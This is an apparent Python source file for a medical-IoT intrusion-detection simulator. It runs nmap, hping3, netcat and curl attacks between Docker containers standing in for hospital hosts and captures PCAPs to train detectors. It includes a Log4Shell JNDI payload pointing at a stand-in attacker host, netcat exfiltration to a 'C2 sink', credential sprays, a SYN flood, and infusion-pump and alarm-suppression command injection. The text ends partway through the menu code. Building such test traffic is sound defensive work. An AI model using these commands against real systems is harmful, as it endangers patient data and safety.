"""
╔══════════════════════════════════════════════════════════════════════════════╗
║       IoMT Medical NIDS Simulator — Physical Docker Attack Detonator        ║
║                         🌍 WORLD 2: PHYSICAL LAYER                         ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  WHAT IS "WORLD 2"?                                                          ║
║  ─────────────────                                                           ║
║  The simulator has two worlds:                                               ║
║                                                                              ║
║  • World 1 (Synthetic):  Python traffic generator. Produces labelled         ║
║    CSV/JSON datasets from probabilistic models — fast, reproducible,         ║
║    no Docker required. Used to train and benchmark NIDS classifiers.         ║
║                                                                              ║
║  • World 2 (Physical):   THIS SCRIPT. Launches REAL hacking tools            ║
║    (nmap, hping3, hydra, netcat) inside Alpine Linux Docker containers       ║
║    that mirror the hospital network topology. Generates ACTUAL network       ║
║    packets captured via tcpdump → PCAP files for DPI / ML validation.        ║
║                                                                              ║
║  WHY WORLD 2?                                                                ║
║  ────────────                                                                ║
║  Synthetic data cannot fully capture real packet-level artifacts such as     ║
║  TCP retransmissions, OS fingerprinting responses, TLS handshake timing,     ║
║  or tool-specific signatures (nmap OS probes, hping3 SYN floods). World 2   ║
║  provides ground-truth PCAP evidence to validate World 1 feature realism.   ║
║                                                                              ║
║  DOCKER NETWORK MAP                                                          ║
║  ──────────────────                                                          ║
║  hacker_apt_external  (10.0.0.100) — External attacker container            ║
║  hospital_router      (10.0.0.1)   — Core router + tcpdump tap              ║
║  ad_server            (10.0.1.10)  — Active Directory / LDAP                ║
║  ehr_frontend         (10.0.1.12)  — EHR web application                    ║
║  file_share           (10.0.1.13)  — SMB file share                         ║
║  pacs_server          (10.0.2.10)  — PACS / DICOM imaging server            ║
║  hl7_engine           (10.0.2.12)  — HL7 clinical messaging engine          ║
║  ct_scanner           (10.0.3.10)  — CT scanner (DICOM endpoint)            ║
║  mri_scanner          (10.0.3.11)  — MRI scanner (DICOM endpoint)           ║
║  telemetry_agg        (10.0.4.10)  — IoMT telemetry aggregator              ║
║  patient_mon_01       (10.0.4.11)  — Bedside patient monitor                ║
║  infusion_pump_01     (10.0.4.12)  — Smart infusion pump                    ║
║  ventilator_01        (10.0.4.13)  — Ventilator                             ║
║  ble_gw               (10.0.4.14)  — BLE gateway                            ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  AVAILABLE ATTACK MODULES (mapped to CVE-informed scenarios)                 ║
║                                                                              ║
║  Classic Kill-Chain Modules:                                                 ║
║  recon        A01: NMAP aggressive scan — Internet edge recon                ║
║  dos          A21: SYN Flood (hping3) — PACS DoS                            ║
║  brute_force  A04: SSH/HTTPS credential spray — AD + EHR                    ║
║  lateral      A17: East-west pivot — IT zone → Clinical / IoMT              ║
║  exfil        A14: PHI exfiltration — PACS + file-share                     ║
║  hl7_flood    A16: HL7 message flood — clinical messaging engine             ║
║  ble_replay   A11: BLE telemetry replay — IoMT aggregator                   ║
║                                                                              ║
║  CVE-Informed 2024-2025 Modules:                                             ║
║  ransomware   A25: ALPHV/BlackCat-style 6-stage ransomware (Change          ║
║               Healthcare Feb 2024 — CVE-2019-19781 Citrix pathway)          ║
║  log4shell    A26: Log4Shell RCE on clinical Java middleware                 ║
║               (CVE-2021-44228 — still found in unpatched FHIR/HL7 stacks)  ║
║  mqtt_hijack  A27: MQTT broker hijack on IoMT subnet                        ║
║               (CVE-2023-28369 class — unauth MQTT, command injection)        ║
║                                                                              ║
║  Combos:                                                                     ║
║  all    Execute ALL 10 modules (complete APT kill-chain)                     ║
║  menu   Interactive selection menu                                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

Usage:
  python scripts/docker_attacker.py --attack recon
  python scripts/docker_attacker.py --attack dos,brute_force,lateral
  python scripts/docker_attacker.py --attack ransomware
  python scripts/docker_attacker.py --attack log4shell,mqtt_hijack
  python scripts/docker_attacker.py --attack all
  python scripts/docker_attacker.py --attack menu
  python scripts/docker_attacker.py --attack all --profile apt28
"""

import subprocess
import argparse
import time
import sys
from pathlib import Path

# ANSI colours for terminal output
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"

# --- Configuration ---
ROUTER_CONTAINER = "hospital_router"
ATTACKER_CONTAINER = "hacker_apt_external"
OUTPUT_DIR = Path("output_datasets")

# --- Target IP Map (from configs/devices/medium_hospital.json Docker subnets) ---
TARGETS = {
    "ad_server":        "10.0.1.10",
    "dns_server":       "10.0.1.11",
    "ehr_frontend":     "10.0.1.12",
    "file_share":       "10.0.1.13",
    "pacs_server":      "10.0.2.10",
    "hl7_engine":       "10.0.2.12",
    "nurse_station_01": "10.0.2.13",
    "device_mgmt":      "10.0.2.14",
    "ct_scanner":       "10.0.3.10",
    "mri_scanner":      "10.0.3.11",
    "telemetry_agg":    "10.0.4.10",
    "patient_mon_01":   "10.0.4.11",
    "infusion_pump_01": "10.0.4.12",
    "ventilator_01":    "10.0.4.13",
    "ble_gw":           "10.0.4.14",
}

# --- Threat Actor Profiles ---
THREAT_PROFILES = {
    "apt28": {
        "name": "APT28 (Fancy Bear)",
        "origin": "Russia (GRU Unit 26165)",
        "focus": "Healthcare espionage, credential theft, data exfil",
        "modules": ["recon", "brute_force", "lateral", "exfil"],
        "cvss_avg": 8.1,
        "real_incidents": ["2023 Norwegian hospital breach", "2024 EU health data theft"],
    },
    "alphv": {
        "name": "ALPHV / BlackCat",
        "origin": "Cybercriminal (RaaS)",
        "focus": "Ransomware-as-a-Service — healthcare encryption + double extortion",
        "modules": ["recon", "brute_force", "lateral", "ransomware"],
        "cvss_avg": 9.3,
        "real_incidents": ["Change Healthcare Feb 2024 (100M patients)", "2023 MGM Health"],
    },
    "lazarus": {
        "name": "Lazarus Group",
        "origin": "North Korea (RGB)",
        "focus": "Financial & pharma espionage, supply-chain compromise",
        "modules": ["recon", "log4shell", "lateral", "exfil"],
        "cvss_avg": 9.0,
        "real_incidents": ["WannaCry NHS 2017", "2021 Pfizer vaccine research breach"],
    },
    "generic_iot": {
        "name": "Generic IoT Threat Actor",
        "origin": "Unknown / hacktivist",
        "focus": "IoMT device exploitation for disruption or data interception",
        "modules": ["recon", "mqtt_hijack", "ble_replay"],
        "cvss_avg": 7.5,
        "real_incidents": ["2024 infusion pump API exposure", "2023 patient monitor MQTT breach"],
    },
}

# All available attack module names
ATTACK_MODULES = [
    "recon", "dos", "brute_force", "lateral", "exfil",
    "hl7_flood", "ble_replay", "ransomware", "log4shell", "mqtt_hijack"
]


def _header(title: str, color: str = Y):
    bar = "═" * 60
    print(f"\n{color}╔{bar}╗")
    print(f"║  {title:<58s}║")
    print(f"╚{bar}╝{RST}")


def _step(msg: str):
    print(f"  {C}▶{RST} {msg}")


def _ok(msg: str):
    print(f"  {G}✓{RST} {msg}")


def _warn(msg: str):
    print(f"  {Y}⚠{RST} {msg}")


def _err(msg: str):
    print(f"  {R}✗{RST} {msg}")


def run_docker_exec(container, command, detach=False):
    """Executes a command inside a specific Docker container."""
    _step(f"[{DIM}{container}{RST}] {command[:80]}{'…' if len(command) > 80 else ''}")
    cmd_list = ["docker", "exec", "-u", "root"]
    if detach:
        cmd_list.append("-d")
    cmd_list.extend([container, "sh", "-c", command])

    if detach:
        subprocess.Popen(cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    else:
        result = subprocess.run(cmd_list, capture_output=True, text=True)
        if result.returncode != 0:
            _err(f"[{container}]: {result.stderr[:200]}")
            return False
        return result.stdout.strip()


def check_containers():
    """Verify that both the router and the attacker containers are actively running."""
    _step("Verifying Docker environment state...")
    result = subprocess.run(["docker", "ps", "--format", "{{.Names}}"], capture_output=True, text=True)
    running = result.stdout.split('\n')
    missing = []
    if ROUTER_CONTAINER not in running:
        missing.append(ROUTER_CONTAINER)
    if ATTACKER_CONTAINER not in running:
        missing.append(ATTACKER_CONTAINER)
    if missing:
        _err(f"Missing required containers: {', '.join(missing)}")
        print(f"  {DIM}Run: docker-compose up -d{RST}")
        sys.exit(1)
    _ok("Required containers are active.")


def setup_environment():
    """Installs necessary attacking tools and capture tools."""
    _step(f"Injecting tcpdump into [{ROUTER_CONTAINER}]...")
    run_docker_exec(ROUTER_CONTAINER, "apk update && apk add tcpdump 2>/dev/null")
    _step(f"Injecting attack tools into [{ATTACKER_CONTAINER}]...")
    run_docker_exec(ATTACKER_CONTAINER,
                    "apk update && apk add nmap hping3 curl netcat-openbsd 2>/dev/null "
                    "--repository=http://dl-cdn.alpinelinux.org/alpine/edge/testing/")
    _ok("Environment preparation complete.")


def start_capture():
    """Starts tcpdump on the router in the background."""
    _step("Starting Network Tap (tcpdump) on Router...")
    run_docker_exec(ROUTER_CONTAINER, "rm -f /tmp/attack_pcap.pcap")
    run_docker_exec(ROUTER_CONTAINER, "tcpdump -i any -w /tmp/attack_pcap.pcap", detach=True)
    time.sleep(2)
    _ok("Router is capturing all cross-layer traffic → /tmp/attack_pcap.pcap")


def stop_capture_and_extract(output_name="physical_attack.pcap"):
    """Stops tcpdump and copies the generated PCAP out of the Docker container."""
    _step(f"Stopping Network Tap on [{ROUTER_CONTAINER}]...")
    run_docker_exec(ROUTER_CONTAINER, "pkill tcpdump || true")
    time.sleep(2)

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    out_path = OUTPUT_DIR / output_name

    _step(f"Extracting PCAP → {out_path}")
    subprocess.run(["docker", "cp", f"{ROUTER_CONTAINER}:/tmp/attack_pcap.pcap", str(out_path)])
    _ok(f"PCAP extracted: {out_path}")
    print(f"  {DIM}Analyze with: wireshark {out_path}  or  tshark -r {out_path}{RST}")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 1: Reconnaissance (A01)
# ══════════════════════════════════════════════════════════════
def execute_recon_attack():
    """A01 — Aggressive NMAP Ping/Port Sweep across all clinical zones."""
    _header("A01 · Aggressive Reconnaissance Sweep", R)
    print(f"  {DIM}Technique: NMAP T4 Fast Scan | Target: 10.0.1.0/24 + 10.0.2.0/24{RST}")
    print(f"  {DIM}CVE Match: Precursor to CVE-2019-19781 (Citrix) exploitation chain{RST}")
    _step("Sweeping IT (10.0.1.0/24) and Clinical Core (10.0.2.0/24) zones...")

    stdout = run_docker_exec(ATTACKER_CONTAINER, "nmap -T4 -F 10.0.1.0/24 10.0.2.0/24")
    print(f"\n  {Y}── NMAP HIGHLIGHTS ──{RST}")
    for line in str(stdout).split('\n'):
        if "report for" in line or "open" in line:
            print(f"    {line}")
    _ok("Reconnaissance complete. High unique_dst_ip + unique_dst_port indicators generated.")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 2: Denial of Service (A21)
# ══════════════════════════════════════════════════════════════
def execute_dos_attack():
    """A21 — SYN Flood Denial of Service against the PACS imaging server."""
    _header("A21 · SYN Flood — PACS Denial of Service", R)
    target_ip = TARGETS["pacs_server"]
    print(f"  {DIM}Technique: hping3 SYN Flood | Target: PACS ({target_ip}:443){RST}")
    print(f"  {DIM}Indicators: retransmissions ↑, rst_rate ↑, service latency spike{RST}")
    _step(f"Unleashing SYN flood against PACS Server ({target_ip})...")

    run_docker_exec(ATTACKER_CONTAINER,
                    f"hping3 -c 5000 -d 120 -S -w 64 -p 443 --flood --rand-source {target_ip}",
                    detach=True)

    for i in range(10, 0, -1):
        print(f"  {R}  Flooding... {i:2d}s remaining{RST}", end='\r')
        time.sleep(1)
    print()

    _step("Halting DoS flood.")
    run_docker_exec(ATTACKER_CONTAINER, "pkill hping3 || true")
    _ok("DoS module complete.")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 3: Brute Force (A04)
# ══════════════════════════════════════════════════════════════
def execute_brute_force_attack():
    """A04 — Brute-force SSH/HTTPS login against AD Server and EHR Frontend."""
    _header("A04 · Brute Force Login Attack", R)
    ad_ip = TARGETS["ad_server"]
    ehr_ip = TARGETS["ehr_frontend"]
    print(f"  {DIM}Technique: SSH netcat spray + HTTPS curl spray{RST}")
    print(f"  {DIM}Targets: AD ({ad_ip}) + EHR ({ehr_ip}){RST}")
    print(f"  {DIM}Indicators: auth_failures ↑, failed_login_count ↑, single dst_ip{RST}")

    _step("Phase 1: SSH brute-force against Active Directory...")
    for i in range(20):
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo 'admin:password{i}' | timeout 2 nc -w 1 {ad_ip} 22 2>/dev/null || true")

    _step("Phase 2: HTTPS credential spray against EHR Frontend...")
    for i in range(15):
        run_docker_exec(ATTACKER_CONTAINER,
                        f"curl -s -o /dev/null -w '%{{http_code}}' --connect-timeout 2 "
                        f"https://{ehr_ip}:443/login -d 'user=admin&pass=attempt{i}' -k 2>/dev/null || true")

    _ok("Brute Force module complete.")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 4: Lateral Movement (A17)
# ══════════════════════════════════════════════════════════════
def execute_lateral_movement():
    """A17 — East-west pivot from IT Zone into Clinical Core and Imaging subnets."""
    _header("A17 · East-West Lateral Movement", R)
    print(f"  {DIM}Technique: nmap port probe + netcat PIVOT from IT into Clinical/Imaging/IoMT{RST}")
    print(f"  {DIM}Indicators: unique_dst_ip ↑, rare zone crossings, enterprise_to_clinical_flows ↑{RST}")

    clinical_targets = [
        ("Nurse Station",   TARGETS["nurse_station_01"], 443),
        ("Device Mgmt",     TARGETS["device_mgmt"],      22),
        ("CT Scanner",      TARGETS["ct_scanner"],        11112),
        ("MRI Scanner",     TARGETS["mri_scanner"],       11112),
        ("Patient Monitor", TARGETS["patient_mon_01"],    8080),
    ]

    _step("Pivoting from compromised IT endpoint into clinical assets...")
    for name, ip, port in clinical_targets:
        print(f"    {Y}→{RST} Probing {name} ({ip}:{port})...")
        run_docker_exec(ATTACKER_CONTAINER, f"nmap -sT -p {port} --open {ip} 2>/dev/null || true")
        run_docker_exec(ATTACKER_CONTAINER, f"echo 'PIVOT' | timeout 2 nc -w 1 {ip} {port} 2>/dev/null || true")

    _ok("Lateral Movement module complete.")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 5: Data Exfiltration (A14/A20)
# ══════════════════════════════════════════════════════════════
def execute_exfiltration():
    """A14/A20 — Simulated PHI exfiltration from PACS + file share to external sink."""
    _header("A14/A20 · Data Exfiltration — PHI Theft", R)
    fs_ip = TARGETS["file_share"]
    pacs_ip = TARGETS["pacs_server"]
    print(f"  {DIM}Technique: nmap enum + dd fake-PHI + netcat push{RST}")
    print(f"  {DIM}Indicators: clinical_to_external_bytes ↑, new external peer, byte burst{RST}")

    _step(f"Stage 1: Enumerating data on File Share ({fs_ip}) and PACS ({pacs_ip})...")
    run_docker_exec(ATTACKER_CONTAINER, f"nmap -sT -p 445,11112 {fs_ip} {pacs_ip} 2>/dev/null || true")

    _step("Stage 2: Staging 1MB of simulated PHI data...")
    run_docker_exec(ATTACKER_CONTAINER, "dd if=/dev/urandom of=/tmp/exfil_payload.bin bs=1024 count=1024 2>/dev/null")

    _step("Stage 3: Exfiltrating payload via TCP to external sink...")
    run_docker_exec(ATTACKER_CONTAINER,
                    f"cat /tmp/exfil_payload.bin | timeout 5 nc -w 2 {TARGETS['dns_server']} 8443 2>/dev/null || true")

    _ok("Exfiltration module complete.")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 6: HL7 Message Flood (A16)
# ══════════════════════════════════════════════════════════════
def execute_hl7_flood():
    """A16 — High-rate malformed HL7 ADT message flood against port 2575."""
    _header("A16 · HL7 Message Flood", R)
    hl7_ip = TARGETS["hl7_engine"]
    print(f"  {DIM}Technique: netcat TCP burst of malformed HL7 ADT^A01 messages{RST}")
    print(f"  {DIM}Target: HL7 Engine ({hl7_ip}:2575){RST}")
    print(f"  {DIM}Indicators: hl7_msg_rate ↑, hl7_error_cnt ↑, non-standard sender IP{RST}")

    hl7_msg = "MSH|^~\\&|ATTACK|BAD|HL7ENGINE|HOSP|20250325||ADT^A01|FLOOD{i}|P|2.5\\rPID|||FAKE^^^MR||DOE^JOHN\\rPV1||I"

    _step(f"Flooding HL7 Engine ({hl7_ip}:2575) with 50 malformed ADT messages...")
    for i in range(50):
        msg = hl7_msg.replace("{i}", str(i))
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '{msg}' | timeout 1 nc -w 1 {hl7_ip} 2575 2>/dev/null || true")

    _ok("HL7 Flood module complete.")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 7: BLE Telemetry Replay (A11)
# ══════════════════════════════════════════════════════════════
def execute_ble_replay():
    """A11 — BLE telemetry replay attack against the IoMT telemetry aggregator."""
    _header("A11 · BLE Telemetry Replay Attack", R)
    telem_ip = TARGETS["telemetry_agg"]
    ble_gw_ip = TARGETS["ble_gw"]
    print(f"  {DIM}Technique: replayed vital-sign BLE frames (TCP-encapsulated for Docker){RST}")
    print(f"  {DIM}Targets: Telemetry Agg ({telem_ip}) + BLE GW ({ble_gw_ip}){RST}")
    print(f"  {DIM}Indicators: replay_alerts ↑, duplicate seq IDs, ble_telemetry_cnt flat-lines{RST}")

    _step("Replaying spoofed vital-sign telemetry (30 packets with looping seq IDs)...")
    for i in range(30):
        payload = f"BLE_REPLAY|sensor_id=wearable_01|hr=72|spo2=98|bp=120/80|seq={i % 5}"
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '{payload}' | timeout 1 nc -w 1 {telem_ip} 8080 2>/dev/null || true")

    _step("Flooding BLE Gateway with spoofed alarm-suppression packets (20 pkts)...")
    for i in range(20):
        payload = f"BLE_SPOOF|sensor_id=patient_mon_fake|hr=999|spo2=50|seq={i}"
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '{payload}' | timeout 1 nc -w 1 {ble_gw_ip} 8080 2>/dev/null || true")

    _ok("BLE Replay module complete.")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 8: ALPHV/BlackCat Ransomware Staging (A25)
# CVE: CVE-2019-19781 (Citrix ADC), no-MFA VPN access
# Incident: Change Healthcare, Feb 2024 (100M patients affected)
# ══════════════════════════════════════════════════════════════
def execute_ransomware_staging():
    """A25 — Full 6-stage ALPHV/BlackCat healthcare ransomware simulation."""
    _header("A25 · ALPHV/BlackCat Healthcare Ransomware  [CVE-2019-19781]", M)
    print(f"  {DIM}Real incident: Change Healthcare (Feb 2024) — ~100M patient records{RST}")
    print(f"  {DIM}Entry: Stolen Citrix credentials, no MFA → full domain compromise{RST}")
    print()

    # Stage 1: Initial VPN access simulation
    print(f"  {M}[Stage 1/6] VPN Initial Access (CVE-2019-19781){RST}")
    _step("Simulating stolen Citrix credential use — new VPN session off-hours...")
    run_docker_exec(ATTACKER_CONTAINER,
                    f"curl -s -o /dev/null --connect-timeout 2 "
                    f"https://{TARGETS['ad_server']}/vpn/login -d 'username=svc_backup&password=P@ssw0rd123' -k || true")
    time.sleep(1)

    # Stage 2: Domain Recon (BloodHound-style LDAP enumeration)
    print(f"\n  {M}[Stage 2/6] Domain Reconnaissance — BloodHound-style AD Enumeration{RST}")
    _step("Rapid LDAP enum against AD server — unique_dst_ip and unique_dst_port spike...")
    ad_ip = TARGETS["ad_server"]
    for port in [389, 636, 3268, 3269, 445, 88]:
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '' | timeout 1 nc -w 1 {ad_ip} {port} 2>/dev/null || true")
    run_docker_exec(ATTACKER_CONTAINER, f"nmap -sT -p 389,636,445,88 {ad_ip} 2>/dev/null || true")
    time.sleep(1)

    # Stage 3: Lateral RDP/SMB Movement
    print(f"\n  {M}[Stage 3/6] Lateral RDP/SMB Movement → Backup + File Share + EHR{RST}")
    _step("Pivoting to high-value targets via RDP(3389) and SMB(445)...")
    for name, target in [("File Share", TARGETS["file_share"]),
                          ("EHR Frontend", TARGETS["ehr_frontend"])]:
        _step(f"→ Probing {name}...")
        for port in [445, 3389, 22]:
            run_docker_exec(ATTACKER_CONTAINER,
                            f"echo 'SMB' | timeout 1 nc -w 1 {target} {port} 2>/dev/null || true")
    time.sleep(1)

    # Stage 4: Backup Deletion (shadow copy wipe simulation)
    print(f"\n  {M}[Stage 4/6] Backup Deletion — Shadow Copy Wipe{RST}")
    _step("Calling backup server API (simulated shadow copy deletion)...")
    run_docker_exec(ATTACKER_CONTAINER,
                    f"curl -s -X DELETE --connect-timeout 2 "
                    f"http://{TARGETS.get('file_share', '10.0.1.13')}:9999/api/backups/latest -k || true")
    _step("Backup traffic should now drop to zero — reboot_events indicator fires...")
    time.sleep(1)

    # Stage 5: Data Exfiltration (PHI staging)
    print(f"\n  {M}[Stage 5/6] PHI Data Exfiltration — Pre-Encryption Double Extortion{RST}")
    _step("Staging 2MB simulated PHI data payload...")
    run_docker_exec(ATTACKER_CONTAINER,
                    "dd if=/dev/urandom of=/tmp/phi_steal.bin bs=1024 count=2048 2>/dev/null")
    _step("Exfiltrating to external C2 sink — large outbound burst on external peer...")
    run_docker_exec(ATTACKER_CONTAINER,
                    f"cat /tmp/phi_steal.bin | timeout 8 nc -w 3 {TARGETS['dns_server']} 4444 2>/dev/null || true")
    time.sleep(1)

    # Stage 6: Ransomware Payload Deployment
    print(f"\n  {M}[Stage 6/6] Ransomware Payload Deployment — SMB Write Storm{RST}")
    _step("Simulating ransomware write operations to file share (SMB saturation)...")
    for i in range(20):
        run_docker_exec(ATTACKER_CONTAINER,
                        f"dd if=/dev/urandom of=/tmp/ransom_{i}.enc bs=512 count=1 2>/dev/null && "
                        f"echo 'RANSOM_CONTENT' | timeout 1 nc -w 1 {TARGETS['file_share']} 445 2>/dev/null || true")

    _ok("ALPHV Ransomware Staging module complete. 6/6 kill-chain stages executed.")
    print(f"  {DIM}Indicators generated: vpn_access, ldap_enum, rdp_pivot, backup_silence, "
          f"phi_exfil, smb_saturation{RST}")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 9: Log4Shell RCE on Clinical Middleware (A26)
# CVE: CVE-2021-44228
# Prevalence: Still found in unpatched FHIR/HL7 Java systems (2024)
# ══════════════════════════════════════════════════════════════
def execute_log4shell_simulation():
    """A26 — Log4Shell RCE exploitation simulation on clinical Java middleware."""
    _header("A26 · Log4Shell RCE — Clinical Java Middleware  [CVE-2021-44228]", M)
    fhir_ip = TARGETS.get("pacs_server", "10.0.2.10")  # FHIR proxy via PACS
    hl7_ip  = TARGETS["hl7_engine"]
    print(f"  {DIM}CVE-2021-44228: Apache Log4j JNDI lookup injection → RCE{RST}")
    print(f"  {DIM}Still found in unpatched Java-based FHIR/HL7 gateways as of 2024{RST}")
    print(f"  {DIM}Targets: FHIR/PACS proxy ({fhir_ip}), HL7 Engine ({hl7_ip}){RST}")
    print()

    # Stage 1: JNDI Probe
    print(f"  {M}[Stage 1/5] JNDI Injection Probe{RST}")
    _step("Sending crafted HTTPS request with Log4Shell JNDI payload in User-Agent header...")
    jndi_payload = r"${jndi:ldap://attacker.c2.local:1389/exploit}"
    run_docker_exec(ATTACKER_CONTAINER,
                    f"curl -s -o /dev/null --connect-timeout 3 -k "
                    f"-A '{jndi_payload}' "
                    f"-H 'X-Api-Version: {jndi_payload}' "
                    f"https://{fhir_ip}:443/fhir/metadata || true")
    time.sleep(1)

    # Stage 2: LDAP Callback simulation
    print(f"\n  {M}[Stage 2/5] LDAP Callback — Outbound C2 Connection{RST}")
    _step("Simulating outbound LDAP/RMI callback to attacker C2 (new external peer)...")
    run_docker_exec(ATTACKER_CONTAINER,
                    f"echo 'LDAP_CALLBACK' | timeout 2 nc -w 1 {TARGETS['dns_server']} 1389 2>/dev/null || true")
    time.sleep(1)

    # Stage 3: RCE / Reverse Shell establishment
    print(f"\n  {M}[Stage 3/5] RCE Established — Persistent Reverse TCP Session{RST}")
    _step("Establishing low-intensity persistent TCP session (simulates reverse shell heartbeat)...")
    run_docker_exec(ATTACKER_CONTAINER,
                    f"for i in $(seq 1 5); do "
                    f"echo 'SHELL_KEEPALIVE' | timeout 1 nc -w 1 {TARGETS['dns_server']} 4443 2>/dev/null; "
                    f"sleep 2; done || true", detach=True)
    time.sleep(3)

    # Stage 4: Internal Recon from FHIR host
    print(f"\n  {M}[Stage 4/5] Internal Subnet Recon from Compromised FHIR Host{RST}")
    _step("Scanning clinical subnet from FHIR host (east-west flows from unusual src IP)...")
    run_docker_exec(ATTACKER_CONTAINER,
                    f"nmap -sT -F 10.0.2.0/24 2>/dev/null || true")
    time.sleep(1)

    # Stage 5: Bulk FHIR API PHI read
    print(f"\n  {M}[Stage 5/5] Bulk FHIR API Read — Patient Record Enumeration{RST}")
    _step("Issuing rapid FHIR GET queries to enumerate patient records...")
    for resource in ["Patient", "Observation", "MedicationRequest", "Encounter", "AllergyIntolerance"]:
        run_docker_exec(ATTACKER_CONTAINER,
                        f"curl -s -o /dev/null --connect-timeout 2 -k "
                        f"https://{fhir_ip}/fhir/{resource}?_count=1000 || true")

    _ok("Log4Shell simulation complete. 5/5 stages executed.")
    print(f"  {DIM}Indicators: JNDI probe, outbound LDAP, reverse-TCP session, "
          f"east-west recon, bulk FHIR GET{RST}")


# ══════════════════════════════════════════════════════════════
# ATTACK MODULE 10: MQTT IoMT Hijack (A27)
# CVE: CVE-2023-28369 (Eclipse Mosquitto) / unauth MQTT brokers
# ══════════════════════════════════════════════════════════════
def execute_mqtt_hijack():
    """A27 — MQTT broker hijack: subscribe to all topics, inject device commands."""
    _header("A27 · MQTT IoMT Broker Hijack  [CVE-2023-28369 class]", M)
    telem_ip   = TARGETS["telemetry_agg"]
    pump_ip    = TARGETS["infusion_pump_01"]
    monitor_ip = TARGETS["patient_mon_01"]
    print(f"  {DIM}CVE-2023-28369: Eclipse Mosquitto ACL bypass → unauthorized subscribe/publish{RST}")
    print(f"  {DIM}Targets: MQTT broker on telemetry aggregator ({telem_ip}:1883){RST}")
    print(f"  {DIM}Downstream impact: infusion pump ({pump_ip}), patient monitor ({monitor_ip}){RST}")
    print()

    # Stage 1: Broker Discovery
    print(f"  {M}[Stage 1/5] MQTT Broker Discovery{RST}")
    _step("Scanning IoMT subnet for unauthenticated MQTT brokers on port 1883/8883...")
    run_docker_exec(ATTACKER_CONTAINER,
                    "nmap -sT -p 1883,8883 10.0.4.0/24 2>/dev/null || true")
    time.sleep(1)

    # Stage 2: Unauthenticated CONNECT + wildcard SUBSCRIBE
    print(f"\n  {M}[Stage 2/5] Unauthenticated CONNECT + Wildcard SUBSCRIBE{RST}")
    _step("Sending raw MQTT CONNECT packet (unauthenticated) to broker...")
    # Raw MQTT CONNECT frame for broker probe (port 1883)
    mqtt_connect = r"\x10\x12\x00\x04MQTT\x04\x02\x00\x3c\x00\x06attckr"
    run_docker_exec(ATTACKER_CONTAINER,
                    f"printf '{mqtt_connect}' | timeout 2 nc -w 2 {telem_ip} 1883 2>/dev/null || true")
    _step("Subscribing to wildcard # topic to intercept all device telemetry...")
    for _ in range(5):
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo 'MQTT_SUBSCRIBE_ALL' | timeout 1 nc -w 1 {telem_ip} 1883 2>/dev/null || true")
    time.sleep(1)

    # Stage 3: Passive Telemetry Interception
    print(f"\n  {M}[Stage 3/5] Passive Telemetry Interception{RST}")
    _step("Passively listening to vital-sign telemetry (low packet volume, repeated data)...")
    for i in range(10):
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo 'MQTT_LISTEN_{i}' | timeout 1 nc -w 1 {telem_ip} 8080 2>/dev/null || true")
    time.sleep(1)

    # Stage 4: Malicious Command PUBLISH
    print(f"\n  {M}[Stage 4/5] Malicious MQTT PUBLISH — Device Command Injection{RST}")
    _step("Publishing to infusion pump control topic (dose rate tampering)...")
    for i in range(10):
        payload = f"MQTT_CMD|topic=pump/01/rate|value=999.9ml_hr|seq={i}"
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '{payload}' | timeout 1 nc -w 1 {pump_ip} 1883 2>/dev/null || true")

    _step("Publishing alarm suppression to patient monitor...")
    for i in range(8):
        payload = f"MQTT_CMD|topic=monitor/01/alarm|action=SUPPRESS_ALL|seq={i}"
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '{payload}' | timeout 1 nc -w 1 {monitor_ip} 1883 2>/dev/null || true")
    time.sleep(1)

    # Stage 5: Persistence via MQTT Retain
    print(f"\n  {M}[Stage 5/5] Persistence — MQTT Retain Flag Injection{RST}")
    _step("Setting RETAIN flag on malicious topic (survives broker restart)...")
    for _ in range(3):
        payload = "MQTT_RETAIN|topic=hospital/config|value=ATTACKER_CONTROLLED|retain=1"
        run_docker_exec(ATTACKER_CONTAINER,
                        f"echo '{payload}' | timeout 1 nc -w 1 {telem_ip} 1883 2>/dev/null || true")

    _ok("MQTT IoMT Hijack module complete. 5/5 stages executed.")
    print(f"  {DIM}Indicators: port-1883 scan, wildcard subscribe, low-volume passive intercept, "
          f"command injection, implausible vitals{RST}")


# ══════════════════════════════════════════════════════════════
# Threat Actor Profile Banner
# ══════════════════════════════════════════════════════════════
def print_profile(profile_key: str):
    p = THREAT_PROFILES.get(profile_key)
    if not p:
        _warn(f"Unknown profile '{profile_key}'. Using all modules.")
        return
    bar = "─" * 58
    print(f"\n{B}┌{bar}┐")
    print(f"│  🎭  THREAT ACTOR PROFILE                              │")
    print(f"├{bar}┤")
    print(f"│  Name:    {p['name']:<47s}│")
    print(f"│  Origin:  {p['origin']:<47s}│")
    print(f"│  Focus:   {p['focus'][:47]:<47s}│")
    print(f"│  CVSS Avg: {p['cvss_avg']:.1f}  Modules: {', '.join(p['modules']):<35s}│")
    print(f"├{bar}┤")
    print(f"│  Known Incidents:                                      │")
    for inc in p["real_incidents"]:
        print(f"│    • {inc:<53s}│")
    print(f"└{bar}┘{RST}")


# ══════════════════════════════════════════════════════════════
# Interactive Menu
# ══════════════════════════════════════════════════════════════
def interactive_menu():
    """Display interactive attack selection menu."""
    attack_info = {
